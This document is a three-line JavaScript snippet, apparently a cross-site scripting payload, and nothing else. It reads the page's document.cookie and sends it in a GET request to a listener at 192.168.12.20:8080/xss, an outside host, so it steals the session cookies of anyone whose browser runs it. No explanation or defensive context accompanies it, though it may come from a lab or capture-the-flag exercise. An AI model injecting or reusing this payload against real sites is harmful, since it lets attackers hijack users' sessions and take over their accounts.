var xmlhttp = new XMLHttpRequest()
xmlhttp.open('GET','http://192.168.12.20:8080/xss?cookie=' + document.cookie,true);
xmlhttp.send();